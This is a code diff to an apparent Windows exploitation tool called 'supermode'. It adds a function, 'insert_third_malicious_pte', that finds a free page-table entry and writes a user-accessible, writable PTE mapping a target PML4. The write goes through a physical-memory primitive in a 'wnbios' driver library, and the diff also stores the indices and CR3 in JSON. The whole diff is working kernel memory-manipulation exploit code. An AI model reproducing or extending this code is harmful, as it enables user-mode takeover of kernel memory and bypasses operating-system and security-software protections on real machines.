@@ -113,11 +113,14 @@ namespace supermode
 	};
 
 	wnbios_lib wnbios;
+
 	uint64_t mal_pointer_pte_ind[4];
 	uint64_t mal_pte_ind[4];
+	uint64_t mal_pml4_pte_ind[4];
 
 	uint64_t mal_pointer_pte_struct[3];
 	uint64_t mal_pte_struct[3];
+	uint64_t mal_pml4_pte_struct[3];
 
 	struct PTE_PFN
 	{
@@ -347,7 +350,39 @@ namespace supermode
 		uintptr_t mal_pte_phys = mal_pointer_pte_struct[PT] + mal_pointer_pte_ind[PT] * sizeof(uintptr_t);
 		
 		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
-		std::cout << "inserted second malicious pdpt at index " << mal_pointer_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << std::dec << " pointing to pfn " << mal_pte_pfn.pfn << std::endl;
+		std::cout << "inserted second malicious pte at index " << mal_pointer_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << " pointing to pfn " << mal_pte_pfn.pfn << std::endl;
+	}
+
+	void insert_third_malicious_pte(uintptr_t target_pml4)
+	{
+		std::cout << "inserting third pte for dbt: " << std::hex << target_pml4 << std::dec << std::endl;
+
+		// find a free pte and populate other indices while at it
+		valid_pml4e(&mal_pml4_pte_ind[PML4], &mal_pml4_pte_struct[PDPT]);
+		valid_pdpte(mal_pml4_pte_struct[PDPT], &mal_pml4_pte_ind[PDPT], &mal_pml4_pte_struct[PD]);
+		valid_pde(mal_pml4_pte_struct[PD], &mal_pml4_pte_ind[PD], &mal_pml4_pte_struct[PT]);
+		free_pte(mal_pml4_pte_struct[PT], &mal_pml4_pte_ind[PT]);
+
+		std::cout << "PML4: " << mal_pml4_pte_ind[PML4] << std::endl
+			<< "PDPT: " << mal_pml4_pte_ind[PDPT] << std::endl
+			<< "PD: " << mal_pml4_pte_ind[PD] << std::endl
+			<< "PT: " << mal_pml4_pte_ind[PT] << std::endl;
+
+		auto pml4_pte_pfn = calc_pfnpte_from_addr(target_pml4);
+
+		PTE mal_pte;
+		mal_pte.Present = 1;
+		mal_pte.ReadWrite = 1;
+		mal_pte.UserSupervisor = 1;
+		mal_pte.PageFrameNumber = pml4_pte_pfn.pfn;
+		mal_pte.ExecuteDisable = 1;
+		mal_pte.Dirty = 1;
+		mal_pte.Accessed = 1;
+
+		uintptr_t mal_pte_phys = mal_pml4_pte_struct[PT] + mal_pml4_pte_ind[PT] * sizeof(uintptr_t);
+
+		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
+		std::cout << "inserted third malicious pte at index " << mal_pml4_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << " pointing to pfn " << pml4_pte_pfn.pfn << " offset: " << pml4_pte_pfn.offset << std::dec << std::endl;
 	}
 
 	// goofy ahh
@@ -356,11 +391,13 @@ namespace supermode
 		nlohmann::json j;
 		j["mal_pte_indices"] = {};
 		j["mal_pointer_pte_indices"] = {};
+		j["mal_pml4_pte_indices"] = {};
 
 		for (int i = 0; i <= PT; i++)
 		{
 			j["mal_pte_indices"][std::to_string(i)] = mal_pte_ind[i];
 			j["mal_pointer_pte_indices"][std::to_string(i)] = mal_pointer_pte_ind[i];
+			j["mal_pml4_pte_indices"][std::to_string(i)] = mal_pml4_pte_ind[i];
 		}
 
 		j["cr3"] = wnbios.get_system_dirbase();
